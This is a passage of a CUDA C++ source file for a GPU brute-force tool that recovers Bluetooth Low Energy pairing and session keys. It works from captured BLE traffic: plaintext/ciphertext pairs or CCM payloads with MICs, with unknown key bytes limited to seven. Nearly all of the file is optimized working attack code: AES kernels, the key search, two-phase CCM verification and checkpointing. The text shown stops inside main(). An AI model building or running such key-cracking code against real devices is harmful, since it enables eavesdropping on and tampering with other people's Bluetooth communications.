// Average speed: 10.41 x 10^9 keys/sec
#include <cuda_runtime.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#include <array>
#include <fstream>
#include <string>
#include <vector>

#include "aes_bruteforcer.h"

#define KEYS_PER_THREAD 24
#define KEYS_PER_THREAD_MIN (KEYS_PER_THREAD - 1)
#define ATTACK_MODE_FAST 2
#define ATTACK_MODE_BLE_CCM 3
#define MAX_BLE_OBSERVATIONS 4
#define BLE_V3_OBS_SIZE 104
#define BLE_V3_OBS_WORDS 26

// 3-input XOR using LOP3 instruction (truth table 0x96 = a^b^c)
__device__ __forceinline__ u32 xor3(u32 a, u32 b, u32 c) {
  u32 result;
  asm("lop3.b32 %0, %1, %2, %3, 0x96;" : "=r"(result) : "r"(a), "r"(b), "r"(c));
  return result;
}

// 5-input XOR using two LOP3 instructions
__device__ __forceinline__ u32 xor5(u32 a, u32 b, u32 c, u32 d, u32 e) {
  u32 tmp;
  asm("lop3.b32 %0, %1, %2, %3, 0x96;" : "=r"(tmp) : "r"(a), "r"(b), "r"(c));
  asm("lop3.b32 %0, %1, %2, %3, 0x96;" : "=r"(tmp) : "r"(tmp), "r"(d), "r"(e));
  return tmp;
}

// Byte extraction using PRMT instruction (single instruction per byte)
__device__ __forceinline__ u32 byte0(u32 x) {
  u32 r;
  asm("prmt.b32 %0, %1, 0, 0x4440;" : "=r"(r) : "r"(x));
  return r;
}
__device__ __forceinline__ u32 byte1(u32 x) {
  u32 r;
  asm("prmt.b32 %0, %1, 0, 0x4441;" : "=r"(r) : "r"(x));
  return r;
}
__device__ __forceinline__ u32 byte2(u32 x) {
  u32 r;
  asm("prmt.b32 %0, %1, 0, 0x4442;" : "=r"(r) : "r"(x));
  return r;
}
__device__ __forceinline__ u32 byte3(u32 x) {
  u32 r;
  asm("prmt.b32 %0, %1, 0, 0x4443;" : "=r"(r) : "r"(x));
  return r;
}

// Multiply-add instruction for efficient address computation
__device__ __forceinline__ u32 mad_lo_u32(u32 a, u32 b, u32 c) {
  u32 result;
  asm("mad.lo.u32 %0, %1, %2, %3;" : "=r"(result) : "r"(a), "r"(b), "r"(c));
  return result;
}

// Bit field insert: insert 8 bits from 'byte' into 'base' at bit position
// 'bitPos'
__device__ __forceinline__ u32 bfi_byte(u32 byte, u32 base, u32 bitPos) {
  u32 result;
  asm("bfi.b32 %0, %1, %2, %3, 8;"
      : "=r"(result)
      : "r"(byte), "r"(base), "r"(bitPos));
  return result;
}

// T0 table lookup with optimized addressing
__device__ __forceinline__ u32 t0_lookup_ptx(const u32 table[][32], u32 index,
                                             u32 warpIdx) {
  u32 offset = mad_lo_u32(index, 32, warpIdx);
  return table[0][offset];
}

// Funnel shift for efficient rotations
__device__ __forceinline__ u32 rotr8_ptx(u32 x) {
  u32 r;
  asm("shf.r.clamp.b32 %0, %1, %1, 8;" : "=r"(r) : "r"(x));
  return r;
}

__device__ __forceinline__ u32 rotr16_ptx(u32 x) {
  u32 r;
  asm("shf.r.clamp.b32 %0, %1, %1, 16;" : "=r"(r) : "r"(x));
  return r;
}

__device__ __forceinline__ u32 rotr24_ptx(u32 x) {
  u32 r;
  asm("shf.r.clamp.b32 %0, %1, %1, 24;" : "=r"(r) : "r"(x));
  return r;
}

struct KeyPlan {
  int wordIndices[16];  // Which 32-bit word each byte belongs to
  int shifts[16];       // Bit shift position for each byte
  int numBytes;         // Number of obscured bytes
};

// GPU context for managing resources per device (BLE version with extra fields)
struct GpuContext {
  int deviceId;
  u32* d_baseKey;
  u32* d_derivationNonce;  // SKD (session key derivation input)
  u32* d_plaintext;
  u32* d_targetCiphertext;
  u32* d_compareMask;
  u32* d_bleObs;
  u32* d_foundKey;
  int* d_found;
  u32* d_t0;
  u32 *d_t4_0, *d_t4_1, *d_t4_2, *d_t4_3;
  u32* d_rcon;
  cudaStream_t stream;
  int threadsPerBlock;
  int maxGridSizeX;
  u64 rangeStart;
  u64 rangeEnd;
  u64 currentIdx;
  u64 keysProcessed;
};

struct AttackData {
  u8 mode;
  u8 key_size;
  u8 payload_len;
  u8 obs_count;
  std::array<u8, 16> P;
  std::array<u8, 16> C;
  std::array<u8, 16> SKD;
  std::array<u8, MAX_BLE_OBSERVATIONS * BLE_V3_OBS_WORDS * 4> ble_obs_words;
};

static bool load_attack_data(const std::string& path, AttackData* out) {
  if (!out) return false;

  std::ifstream f(path, std::ios::binary);
  if (!f) return false;

  std::vector<unsigned char> bytes((std::istreambuf_iterator<char>(f)),
                                   std::istreambuf_iterator<char>());
  for (size_t i = 0; i < out->ble_obs_words.size(); ++i)
    out->ble_obs_words[i] = 0;

  bool is_v3 = bytes.size() >= 24 && bytes[0] == 'B' && bytes[1] == 'L' &&
               bytes[2] == '3' && bytes[3] == 'C';
  if (is_v3) {
    size_t offset = 4;
    out->mode = ATTACK_MODE_BLE_CCM;
    out->key_size = bytes[offset++];
    out->obs_count = bytes[offset++];
    offset += 2;  // reserved

    if (out->key_size == 0 || out->key_size > 7) return false;
    if (out->obs_count == 0 || out->obs_count > MAX_BLE_OBSERVATIONS)
      return false;
    if (bytes.size() != 24 + (size_t)out->obs_count * BLE_V3_OBS_SIZE)
      return false;

    for (int i = 0; i < 16; ++i) out->SKD[i] = bytes[offset + i];
    offset += 16;

    for (int obs = 0; obs < out->obs_count; ++obs) {
      size_t obsBase = obs * BLE_V3_OBS_SIZE;
      if (bytes[offset] == 0 || bytes[offset] > 16) return false;
      for (int i = 0; i < BLE_V3_OBS_SIZE; ++i) {
        out->ble_obs_words[obsBase + i] = bytes[offset + i];
      }
      offset += BLE_V3_OBS_SIZE;
    }

    out->payload_len = 0;
    return true;
  }

  if (bytes.size() != 49 && bytes.size() != 50) return false;

  out->mode = ATTACK_MODE_FAST;
  out->key_size = bytes[0];
  out->obs_count = 0;
  size_t offset = 1;

  // v2 format (50 bytes): key_size(1) + payload_len(1) + P(16) + C(16) +
  // SKD(16) v1 format (49 bytes): key_size(1) + P(16) + C(16) + SKD(16)
  if (bytes.size() == 50) {
    out->payload_len = bytes[offset++];
  } else {
    out->payload_len = 16;
  }

  if (out->payload_len == 0 || out->payload_len > 16) return false;

  for (int i = 0; i < 16; ++i) out->P[i] = bytes[offset + i];
  offset += 16;
  for (int i = 0; i < 16; ++i) out->C[i] = bytes[offset + i];
  offset += 16;
  for (int i = 0; i < 16; ++i) out->SKD[i] = bytes[offset + i];

  return true;
}

static inline u32 pack_be_u32(const u8* b) {
  return ((u32)b[0] << 24) | ((u32)b[1] << 16) | ((u32)b[2] << 8) | (u32)b[3];
}

// Signal handler for graceful shutdown
volatile sig_atomic_t interrupted = 0;

void sigint_handler(int sig) {
  (void)sig;
  interrupted = 1;
}

// ============================================================================
// AES DEVICE FUNCTIONS
// ============================================================================

// AES-128 key expansion
__device__ __forceinline__ void aes_key_expansion(
    const u32* key, u32* roundKeys, const u32* __restrict__ t4_0_shared,
    const u32* __restrict__ t4_1_shared, const u32* __restrict__ t4_2_shared,
    const u32* __restrict__ t4_3_shared, const u32* __restrict__ rcon_shared) {
  u32 rk[4];
  rk[0] = key[0];
  rk[1] = key[1];
  rk[2] = key[2];
  rk[3] = key[3];

  roundKeys[0] = rk[0];
  roundKeys[1] = rk[1];
  roundKeys[2] = rk[2];
  roundKeys[3] = rk[3];

#pragma unroll
  for (int round = 0; round < ROUND_COUNT; round++) {
    u32 temp = rk[3];
    u32 sbox_xor = xor3(t4_3_shared[byte2(temp)], t4_2_shared[byte1(temp)],
                        t4_1_shared[byte0(temp)]);
    rk[0] =
        xor5(rk[0], sbox_xor, t4_0_shared[byte3(temp)], rcon_shared[round], 0);
    rk[1] ^= rk[0];
    rk[2] ^= rk[1];
    rk[3] ^= rk[2];

    roundKeys[round * 4 + 4] = rk[0];
    roundKeys[round * 4 + 5] = rk[1];
    roundKeys[round * 4 + 6] = rk[2];
    roundKeys[round * 4 + 7] = rk[3];
  }
}

// AES-128 encryption with pre-expanded keys
// Uses alternating state buffers to minimize register moves
__device__ __forceinline__ void aes_encrypt_with_expanded_key(
    u32* state, const u32* roundKeys, const u32 t0_shared[][32],
    const u32* __restrict__ t4_0_shared, const u32* __restrict__ t4_1_shared,
    const u32* __restrict__ t4_2_shared, const u32* __restrict__ t4_3_shared,
    int warpThreadIndex) {
  u32 st[2][4];
  u32 tmp0, tmp1, tmp2, tmp3;

  // Initial AddRoundKey
  st[0][0] = xor3(state[0], roundKeys[0], 0);
  st[0][1] = xor3(state[1], roundKeys[1], 0);
  st[0][2] = xor3(state[2], roundKeys[2], 0);
  st[0][3] = xor3(state[3], roundKeys[3], 0);

  // Rounds 1-9 (full MixColumns), with alternating state buffers.
#pragma unroll 9
  for (int round = 1; round <= 9; ++round) {
    int src = (round - 1) & 1;
    int dst = round & 1;

    u32 s0_b0 = byte0(st[src][0]);
    u32 s0_b1 = byte1(st[src][0]);
    u32 s0_b2 = byte2(st[src][0]);
    u32 s0_b3 = byte3(st[src][0]);
    u32 s1_b0 = byte0(st[src][1]);
    u32 s1_b1 = byte1(st[src][1]);
    u32 s1_b2 = byte2(st[src][1]);
    u32 s1_b3 = byte3(st[src][1]);
    u32 s2_b0 = byte0(st[src][2]);
    u32 s2_b1 = byte1(st[src][2]);
    u32 s2_b2 = byte2(st[src][2]);
    u32 s2_b3 = byte3(st[src][2]);
    u32 s3_b0 = byte0(st[src][3]);
    u32 s3_b1 = byte1(st[src][3]);
    u32 s3_b2 = byte2(st[src][3]);
    u32 s3_b3 = byte3(st[src][3]);

    tmp1 = t0_lookup_ptx(t0_shared, s1_b2, warpThreadIndex);
    tmp2 = t0_lookup_ptx(t0_shared, s2_b1, warpThreadIndex);
    tmp3 = t0_lookup_ptx(t0_shared, s3_b0, warpThreadIndex);
    st[dst][0] =
        xor5(t0_lookup_ptx(t0_shared, s0_b3, warpThreadIndex), rotr8_ptx(tmp1),
             rotr16_ptx(tmp2), rotr24_ptx(tmp3), roundKeys[round * 4]);

    tmp0 = t0_lookup_ptx(t0_shared, s0_b0, warpThreadIndex);
    tmp2 = t0_lookup_ptx(t0_shared, s2_b2, warpThreadIndex);
    tmp3 = t0_lookup_ptx(t0_shared, s3_b1, warpThreadIndex);
    st[dst][1] =
        xor5(t0_lookup_ptx(t0_shared, s1_b3, warpThreadIndex), rotr8_ptx(tmp2),
             rotr16_ptx(tmp3), rotr24_ptx(tmp0), roundKeys[round * 4 + 1]);

    tmp0 = t0_lookup_ptx(t0_shared, s0_b1, warpThreadIndex);
    tmp1 = t0_lookup_ptx(t0_shared, s1_b0, warpThreadIndex);
    tmp3 = t0_lookup_ptx(t0_shared, s3_b2, warpThreadIndex);
    st[dst][2] =
        xor5(t0_lookup_ptx(t0_shared, s2_b3, warpThreadIndex), rotr8_ptx(tmp3),
             rotr16_ptx(tmp0), rotr24_ptx(tmp1), roundKeys[round * 4 + 2]);

    tmp0 = t0_lookup_ptx(t0_shared, s0_b2, warpThreadIndex);
    tmp1 = t0_lookup_ptx(t0_shared, s1_b1, warpThreadIndex);
    tmp2 = t0_lookup_ptx(t0_shared, s2_b0, warpThreadIndex);
    st[dst][3] =
        xor5(t0_lookup_ptx(t0_shared, s3_b3, warpThreadIndex), rotr8_ptx(tmp0),
             rotr16_ptx(tmp1), rotr24_ptx(tmp2), roundKeys[round * 4 + 3]);
  }

  // Final round (no MixColumns), reading the odd-round buffer.
  state[0] =
      xor5(t4_3_shared[byte3(st[1][0])], t4_2_shared[byte2(st[1][1])],
           t4_1_shared[byte1(st[1][2])], t4_0_shared[byte0(st[1][3])],
           roundKeys[40]);
  state[1] =
      xor5(t4_3_shared[byte3(st[1][1])], t4_2_shared[byte2(st[1][2])],
           t4_1_shared[byte1(st[1][3])], t4_0_shared[byte0(st[1][0])],
           roundKeys[41]);
  state[2] =
      xor5(t4_3_shared[byte3(st[1][2])], t4_2_shared[byte2(st[1][3])],
           t4_1_shared[byte1(st[1][0])], t4_0_shared[byte0(st[1][1])],
           roundKeys[42]);
  state[3] =
      xor5(t4_3_shared[byte3(st[1][3])], t4_2_shared[byte2(st[1][0])],
           t4_1_shared[byte1(st[1][1])], t4_0_shared[byte0(st[1][2])],
           roundKeys[43]);
}

// AES-ECB encryption (key expansion + encryption in one call)
__device__ __forceinline__ void aes_ecb_encrypt(
    u32* state, const u32* key, const u32 t0_shared[][32],
    const u32* __restrict__ t4_0_shared, const u32* __restrict__ t4_1_shared,
    const u32* __restrict__ t4_2_shared, const u32* __restrict__ t4_3_shared,
    const u32* __restrict__ rcon_shared, int warpThreadIndex) {
  u32 roundKeys[44];
  aes_key_expansion(key, roundKeys, t4_0_shared, t4_1_shared, t4_2_shared,
                    t4_3_shared, rcon_shared);
  aes_encrypt_with_expanded_key(state, roundKeys, t0_shared, t4_0_shared,
                                t4_1_shared, t4_2_shared, t4_3_shared,
                                warpThreadIndex);
}

__device__ __forceinline__ void load_aes_tables_shared(
    u32 t0_shared[][32], u32* t4_0_shared, u32* t4_1_shared,
    u32* t4_2_shared, u32* t4_3_shared, u32* rcon_shared,
    const u32* __restrict__ t0_global, const u32* __restrict__ t4_0_global,
    const u32* __restrict__ t4_1_global, const u32* __restrict__ t4_2_global,
    const u32* __restrict__ t4_3_global, const u32* __restrict__ rcon_global) {
  if (threadIdx.x < 256) {
    for (int bankIndex = 0; bankIndex < 32; bankIndex++) {
      t0_shared[threadIdx.x][bankIndex] = t0_global[threadIdx.x];
    }
    t4_0_shared[threadIdx.x] = t4_0_global[threadIdx.x];
    t4_1_shared[threadIdx.x] = t4_1_global[threadIdx.x];
    t4_2_shared[threadIdx.x] = t4_2_global[threadIdx.x];
    t4_3_shared[threadIdx.x] = t4_3_global[threadIdx.x];

    if (threadIdx.x < RCON_SIZE) {
      rcon_shared[threadIdx.x] = rcon_global[threadIdx.x];
    }
  }

  __syncthreads();
}

__device__ __forceinline__ void construct_pairing_key(
    u32* pairingKey, uint4 baseKey, u64 testValue, KeyPlan plan) {
  pairingKey[0] = baseKey.x;
  pairingKey[1] = baseKey.y;
  pairingKey[2] = baseKey.z;
  pairingKey[3] = baseKey.w;

#pragma unroll
  for (int i = 0; i < 16; i++) {
    if (i >= plan.numBytes) break;
    u32 byteVal = (u32)((testValue >> (i * 8)) & 0xFF);
    pairingKey[plan.wordIndices[i]] =
        bfi_byte(byteVal, pairingKey[plan.wordIndices[i]], plan.shifts[i]);
  }
}

__device__ __forceinline__ void publish_found_key(int* found, u32* foundKey,
                                                   const u32* pairingKey) {
  if (atomicExch(found, 1) == 0) {
    ((uint4*)foundKey)[0] = make_uint4(pairingKey[0], pairingKey[1],
                                       pairingKey[2], pairingKey[3]);
  }
}

// ============================================================================
// BLE BRUTE-FORCE KERNEL
// ============================================================================

// BLE workflow: Pairing Key -> ECB(SKD) -> Session Key -> ECB(plaintext) ->
// verify Each thread tests KEYS_PER_THREAD keys (optimized for throughput)
__global__ void bruteforceKernelFast(
    u32* __restrict__ baseKey, KeyPlan plan, u32* __restrict__ derivationNonce,
    u32* __restrict__ plaintext, u32* __restrict__ targetCiphertext,
    u32* __restrict__ compareMask, u32* __restrict__ foundKey,
    int* __restrict__ found, u64 rangeStart, u64 rangeSize,
    const u32* __restrict__ t0G, const u32* __restrict__ t4_0G,
    const u32* __restrict__ t4_1G, const u32* __restrict__ t4_2G,
    const u32* __restrict__ t4_3G, const u32* __restrict__ rconG) {
  int warpThreadIndex = threadIdx.x & 31;

  // Load AES tables into shared memory (2D layout for T0 to avoid bank
  // conflicts)
  __shared__ u32 s_t0[256][32];
  __shared__ u32 s_t4_0[256], s_t4_1[256], s_t4_2[256], s_t4_3[256];
  __shared__ u32 s_rcon[RCON_SIZE];

  load_aes_tables_shared(s_t0, s_t4_0, s_t4_1, s_t4_2, s_t4_3, s_rcon, t0G,
                         t4_0G, t4_1G, t4_2G, t4_3G, rconG);

  // Load constant data into registers using vectorized uint4 loads
  uint4 r_derivationNonce = ((const uint4*)derivationNonce)[0];
  uint4 r_plaintext = ((const uint4*)plaintext)[0];
  uint4 r_targetCiphertext = ((const uint4*)targetCiphertext)[0];
  uint4 r_compareMask = ((const uint4*)compareMask)[0];
  uint4 r_baseKey = ((const uint4*)baseKey)[0];

  // Calculate thread's key range (each thread processes KEYS_PER_THREAD keys)
  u64 blockId = (u64)blockIdx.y * gridDim.x + blockIdx.x;
  u64 threadId = blockId * blockDim.x + threadIdx.x;
  u64 baseIdx = threadId * KEYS_PER_THREAD;

  if (baseIdx >= rangeSize) return;

// Process KEYS_PER_THREAD keys per thread
#pragma unroll 1
  for (int keyIdx = 0; keyIdx < KEYS_PER_THREAD; keyIdx++) {
    u64 currentIdx = baseIdx + keyIdx;
    if (currentIdx >= rangeSize) break;

    u64 testValue = rangeStart + currentIdx;

    u32 pairingKey[4];
    construct_pairing_key(pairingKey, r_baseKey, testValue, plan);

    // Derive session key using AES-ECB(pairingKey, derivationNonce)
    u32 sessionKey[4];
    sessionKey[0] = r_derivationNonce.x;
    sessionKey[1] = r_derivationNonce.y;
    sessionKey[2] = r_derivationNonce.z;
    sessionKey[3] = r_derivationNonce.w;

    aes_ecb_encrypt(sessionKey, pairingKey, s_t0, s_t4_0, s_t4_1, s_t4_2,
                    s_t4_3, s_rcon, warpThreadIndex);

    u32 out[4];
    out[0] = r_plaintext.x;
    out[1] = r_plaintext.y;
    out[2] = r_plaintext.z;
    out[3] = r_plaintext.w;

    aes_ecb_encrypt(out, sessionKey, s_t0, s_t4_0, s_t4_1, s_t4_2, s_t4_3,
                    s_rcon, warpThreadIndex);

    u32 diff = ((out[0] ^ r_targetCiphertext.x) & r_compareMask.x) |
               ((out[1] ^ r_targetCiphertext.y) & r_compareMask.y) |
               ((out[2] ^ r_targetCiphertext.z) & r_compareMask.z) |
               ((out[3] ^ r_targetCiphertext.w) & r_compareMask.w);
    bool match = (diff == 0);

    if (match) {
      publish_found_key(found, foundKey, pairingKey);
    }
  }
}

__device__ __forceinline__ u32 payload_mask_word(u32 payloadLen, int word) {
  u32 mask = 0;
#pragma unroll
  for (int i = 0; i < 4; ++i) {
    int byteIndex = word * 4 + i;
    if (byteIndex < payloadLen) mask |= (0xFFu << ((3 - i) * 8));
  }
  return mask;
}

// Phase 1: cheap payload check (1 AES encrypt).
// Decrypts the CTR keystream block A1 and verifies it matches the
// ciphertext within the payload length mask. Rejects ~all wrong keys
// at the cost of a single AES call.
__device__ __forceinline__ bool verify_ble_ccm_payload(
    const u32* obs, const u32* sessionRoundKeys, const u32 s_t0[][32],
    const u32* __restrict__ s_t4_0, const u32* __restrict__ s_t4_1,
    const u32* __restrict__ s_t4_2, const u32* __restrict__ s_t4_3,
    int warpThreadIndex) {
  u32 payloadLen = obs[0] >> 24;

  u32 a1[4] = {obs[1], obs[2], obs[3], obs[4]};
  aes_encrypt_with_expanded_key(a1, sessionRoundKeys, s_t0, s_t4_0, s_t4_1,
                                s_t4_2, s_t4_3, warpThreadIndex);

  u32 diff =
      ((a1[0] ^ obs[5]) & payload_mask_word(payloadLen, 0)) |
      ((a1[1] ^ obs[6]) & payload_mask_word(payloadLen, 1)) |
      ((a1[2] ^ obs[7]) & payload_mask_word(payloadLen, 2)) |
      ((a1[3] ^ obs[8]) & payload_mask_word(payloadLen, 3));
  return (diff == 0);
}

// Phase 2: full CBC-MAC / MIC verification (4 AES encrypts).
// Only called after all observations have passed the payload check.
__device__ __forceinline__ bool verify_ble_ccm_mic(
    const u32* obs, const u32* sessionRoundKeys, const u32 s_t0[][32],
    const u32* __restrict__ s_t4_0, const u32* __restrict__ s_t4_1,
    const u32* __restrict__ s_t4_2, const u32* __restrict__ s_t4_3,
    int warpThreadIndex) {
  u32 mac[4] = {obs[9], obs[10], obs[11], obs[12]};
  aes_encrypt_with_expanded_key(mac, sessionRoundKeys, s_t0, s_t4_0, s_t4_1,
                                s_t4_2, s_t4_3, warpThreadIndex);

  mac[0] ^= obs[13];
  mac[1] ^= obs[14];
  mac[2] ^= obs[15];
  mac[3] ^= obs[16];
  aes_encrypt_with_expanded_key(mac, sessionRoundKeys, s_t0, s_t4_0, s_t4_1,
                                s_t4_2, s_t4_3, warpThreadIndex);

  mac[0] ^= obs[17];
  mac[1] ^= obs[18];
  mac[2] ^= obs[19];
  mac[3] ^= obs[20];
  aes_encrypt_with_expanded_key(mac, sessionRoundKeys, s_t0, s_t4_0, s_t4_1,
                                s_t4_2, s_t4_3, warpThreadIndex);

  u32 s0[4] = {obs[21], obs[22], obs[23], obs[24]};
  aes_encrypt_with_expanded_key(s0, sessionRoundKeys, s_t0, s_t4_0, s_t4_1,
                                s_t4_2, s_t4_3, warpThreadIndex);

  return ((mac[0] ^ s0[0]) == obs[25]);
}

__global__ void bruteforceKernelBleCcm(
    u32* __restrict__ baseKey, KeyPlan plan, u32* __restrict__ derivationNonce,
    u32* __restrict__ bleObs, int obsCount, u32* __restrict__ foundKey,
    int* __restrict__ found, u64 rangeStart, u64 rangeSize,
    const u32* __restrict__ t0G, const u32* __restrict__ t4_0G,
    const u32* __restrict__ t4_1G, const u32* __restrict__ t4_2G,
    const u32* __restrict__ t4_3G, const u32* __restrict__ rconG) {
  int warpThreadIndex = threadIdx.x & 31;

  __shared__ u32 s_t0[256][32];
  __shared__ u32 s_t4_0[256], s_t4_1[256], s_t4_2[256], s_t4_3[256];
  __shared__ u32 s_rcon[RCON_SIZE];

  load_aes_tables_shared(s_t0, s_t4_0, s_t4_1, s_t4_2, s_t4_3, s_rcon, t0G,
                         t4_0G, t4_1G, t4_2G, t4_3G, rconG);

  uint4 r_derivationNonce = ((const uint4*)derivationNonce)[0];
  uint4 r_baseKey = ((const uint4*)baseKey)[0];

  u64 blockId = (u64)blockIdx.y * gridDim.x + blockIdx.x;
  u64 threadId = blockId * blockDim.x + threadIdx.x;
  u64 baseIdx = threadId * KEYS_PER_THREAD;

  if (baseIdx >= rangeSize) return;

#pragma unroll 1
  for (int keyIdx = 0; keyIdx < KEYS_PER_THREAD; keyIdx++) {
    u64 currentIdx = baseIdx + keyIdx;
    if (currentIdx >= rangeSize) break;

    u64 testValue = rangeStart + currentIdx;

    u32 pairingKey[4];
    construct_pairing_key(pairingKey, r_baseKey, testValue, plan);

    u32 sessionKey[4];
    sessionKey[0] = r_derivationNonce.x;
    sessionKey[1] = r_derivationNonce.y;
    sessionKey[2] = r_derivationNonce.z;
    sessionKey[3] = r_derivationNonce.w;

    aes_ecb_encrypt(sessionKey, pairingKey, s_t0, s_t4_0, s_t4_1, s_t4_2,
                    s_t4_3, s_rcon, warpThreadIndex);

    u32 sessionRoundKeys[44];
    aes_key_expansion(sessionKey, sessionRoundKeys, s_t4_0, s_t4_1, s_t4_2,
                      s_t4_3, s_rcon);

    // Phase 1: run the cheap 1-AES payload check for every observation.
    // A wrong key is rejected here ~100% of the time (probability
    // 2^(-8*payloadLen) of a false pass per observation). Staging all
    // payload checks before any MIC work avoids committing 4 extra AES
    // calls to an observation whose sibling would have failed cheaply.
    bool payloadOk = true;
#pragma unroll
    for (int obsIdx = 0; obsIdx < MAX_BLE_OBSERVATIONS; ++obsIdx) {
      if (obsIdx >= obsCount) break;
      if (!verify_ble_ccm_payload(
              &bleObs[obsIdx * BLE_V3_OBS_WORDS], sessionRoundKeys, s_t0,
              s_t4_0, s_t4_1, s_t4_2, s_t4_3, warpThreadIndex)) {
        payloadOk = false;
        break;
      }
    }

    if (!payloadOk) continue;

    // Phase 2: all payload checks passed — now run the expensive 4-AES
    // CBC-MAC/MIC verification for each observation.
    bool match = true;
#pragma unroll
    for (int obsIdx = 0; obsIdx < MAX_BLE_OBSERVATIONS; ++obsIdx) {
      if (obsIdx >= obsCount) break;
      if (!verify_ble_ccm_mic(
              &bleObs[obsIdx * BLE_V3_OBS_WORDS], sessionRoundKeys, s_t0,
              s_t4_0, s_t4_1, s_t4_2, s_t4_3, warpThreadIndex)) {
        match = false;
        break;
      }
    }

    if (match) {
      publish_found_key(found, foundKey, pairingKey);
    }
  }
}

// ============================================================================
// CHECKPOINT MANAGEMENT
// ============================================================================

// Compute job hash for checkpoint identification
u32 compute_job_hash(u32 mode, u32 obsCount, u32* baseKey, u32* derivationNonce,
                     u32* plaintext, u32* targetCiphertext, u32* compareMask,
                     u32* bleObs) {
  u32 hash = 0x12345678;
  hash ^= mode;
  hash = (hash << 5) | (hash >> 27);
  hash ^= obsCount;
  hash = (hash << 5) | (hash >> 27);
  for (int i = 0; i < 4; i++) {
    hash ^= baseKey[i];
    hash = (hash << 5) | (hash >> 27);
    hash ^= derivationNonce[i];
    hash = (hash << 5) | (hash >> 27);
    hash ^= plaintext[i];
    hash = (hash << 5) | (hash >> 27);
    hash ^= targetCiphertext[i];
    hash = (hash << 5) | (hash >> 27);
    hash ^= compareMask[i];
    hash = (hash << 5) | (hash >> 27);
  }
  if (mode == ATTACK_MODE_BLE_CCM) {
    for (u32 i = 0; i < obsCount * BLE_V3_OBS_WORDS; ++i) {
      hash ^= bleObs[i];
      hash = (hash << 5) | (hash >> 27);
    }
  }
  return hash;
}

// Get checkpoint file path
void get_checkpoint_path(char* path, u32 jobHash) {
  sprintf(path, "checkpoint_%08x.txt", jobHash);
}

// Save checkpoint to file
bool save_checkpoint(const char* path, u32 jobHash, GpuContext* contexts,
                     int numGpus, u64 totalCombinations, double elapsedMs) {
  char tmpPath[256];
  sprintf(tmpPath, "%s.tmp", path);

  FILE* f = fopen(tmpPath, "w");
  if (!f) return false;

  u64 totalProcessed = 0;
  for (int i = 0; i < numGpus; i++) {
    totalProcessed += contexts[i].keysProcessed;
  }

  fprintf(f, "version=1\n");
  fprintf(f, "job_hash=%08x\n", jobHash);
  fprintf(f, "total_combinations=%llu\n", totalCombinations);
  fprintf(f, "num_gpus=%d\n", numGpus);
  fprintf(f, "elapsed_ms=%.2f\n", elapsedMs);
  fprintf(f, "total_processed=%llu\n", totalProcessed);

  for (int i = 0; i < numGpus; i++) {
    fprintf(f, "gpu%d_current_idx=%llu\n", i, contexts[i].currentIdx);
  }

  fclose(f);

  if (rename(tmpPath, path) != 0) {
    remove(tmpPath);
    return false;
  }

  return true;
}

// Load checkpoint from file
bool load_checkpoint(const char* path, u32 expectedHash, u64* gpuCurrentIdx,
                     int expectedNumGpus, u64 expectedTotal, double* elapsedMs,
                     int* fileNumGpus) {
  FILE* f = fopen(path, "r");
  if (!f) return false;

  char line[256];
  int version = 0;
  u32 fileHash = 0;
  u64 fileTotalCombinations = 0;
  u64 fileTotalProcessed = 0;
  *fileNumGpus = 0;
  *elapsedMs = 0.0;

  while (fgets(line, sizeof(line), f)) {
    if (sscanf(line, "version=%d", &version) == 1) continue;
    if (sscanf(line, "job_hash=%x", &fileHash) == 1) continue;
    if (sscanf(line, "total_combinations=%llu", &fileTotalCombinations) == 1)
      continue;
    if (sscanf(line, "num_gpus=%d", fileNumGpus) == 1) continue;
    if (sscanf(line, "elapsed_ms=%lf", elapsedMs) == 1) continue;
    if (sscanf(line, "total_processed=%llu", &fileTotalProcessed) == 1)
      continue;
  }

  fclose(f);

  if (fileHash != expectedHash) {
    printf("Checkpoint hash mismatch: file=%08x expected=%08x\n", fileHash,
           expectedHash);
    return false;
  }

  if (fileTotalCombinations != expectedTotal) {
    printf("Checkpoint total combinations mismatch: file=%llu expected=%llu\n",
           fileTotalCombinations, expectedTotal);
    return false;
  }

  gpuCurrentIdx[0] = fileTotalProcessed;
  return true;
}

void prepareKeyPlan(KeyPlan* plan, int startByte, int numBytes) {
  plan->numBytes = numBytes;
  for (int i = 0; i < numBytes; i++) {
    int currentByte = startByte + i;
    plan->wordIndices[i] = currentByte / 4;
    int byteInWord = currentByte % 4;
    plan->shifts[i] = (3 - byteInWord) * 8;
  }
}

// Print hex data with label
void printHex(const char* label, u32* data, int words) {
  printf("%s", label);
  for (int i = 0; i < words; i++) {
    printf("%08x", data[i]);
  }
  printf("\n");
}

// Format speed as "X.XX x 10^9 keys/sec"
void format_speed(char* buffer, size_t bufferSize, double keysPerSecond) {
  double billions = keysPerSecond / 1e9;
  snprintf(buffer, bufferSize, "%.2f x 10^9 keys/sec", billions);
}

// ============================================================================
// MAIN PROGRAM
// ============================================================================

int main(int argc, char* argv[]) {
  int numGpusArg = 1;

  // Parse command line arguments
  if (argc == 2) {
    numGpusArg = 1;
  } else if (argc == 3) {
    numGpusArg = atoi(argv[2]);
  } else {
    printf("Usage: %s <attack_data_file> [num_gpus]\n", argv[0]);
    return 1;
  }

  printf("========================================\n");
  printf("AES-128 BLE CUDA Brute-Force\n");
  printf("========================================\n\n");

  // Parse inputs (attack_data file)
  u32 baseKey[4] = {0, 0, 0, 0};
  u32 derivationNonce[4] = {0, 0, 0, 0};
  u32 plaintext[4] = {0, 0, 0, 0};
  u32 targetCiphertext[4] = {0, 0, 0, 0};
  u32 compareMask[4] = {0, 0, 0, 0};
  u32 bleObs[MAX_BLE_OBSERVATIONS * BLE_V3_OBS_WORDS] = {0};

  AttackData d;
  if (!load_attack_data(argv[1], &d)) {
    printf("Error: failed to read attack data file\n");
    return 1;
  }

  if (d.key_size == 0 || d.key_size > 7) {
    printf("Error: key_size must be 1..7 for GPU bruteforce (got %u)\n",
           d.key_size);
    return 1;
  }

  for (int i = 0; i < 4; i++) {
    derivationNonce[i] = pack_be_u32(&d.SKD[i * 4]);
  }

  if (d.mode == ATTACK_MODE_FAST) {
    for (int i = 0; i < 4; i++) {
      plaintext[i] = pack_be_u32(&d.P[i * 4]);
      targetCiphertext[i] = pack_be_u32(&d.C[i * 4]);
      compareMask[i] = 0;
    }

    for (int i = 0; i < d.payload_len; ++i) {
      int word = i / 4;
      int byteInWord = i % 4;
      compareMask[word] |= (0xFFu << ((3 - byteInWord) * 8));
    }
  } else if (d.mode == ATTACK_MODE_BLE_CCM) {
